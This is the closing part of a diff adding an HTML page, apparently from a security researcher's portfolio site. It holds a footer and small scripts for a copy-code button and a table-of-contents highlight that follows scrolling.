+    <a href="index.html#contact">Contact</a>
+  </div>
+  Built by <span>Dilan Dodangodage</span> · Aspiring Penetration Tester &amp; Security Researcher
+</footer>
+
+<script>
+  // Copy code button
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = 'copy', 2000);
+    });
+  }
+
+  // TOC active highlight on scroll
+  const headings = document.querySelectorAll('.section-block h2, .section-block h3');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+
+  window.addEventListener('scroll', () => {
+    let current = '';
+    headings.forEach(h => {
+      if (window.scrollY >= h.offsetTop - 140) current = h.id;
+    });
+    tocLinks.forEach(a => {
+      a.classList.toggle('active', a.getAttribute('href') === '#' + current);
+    });
+  });
+</script>
+</body>
+</html>
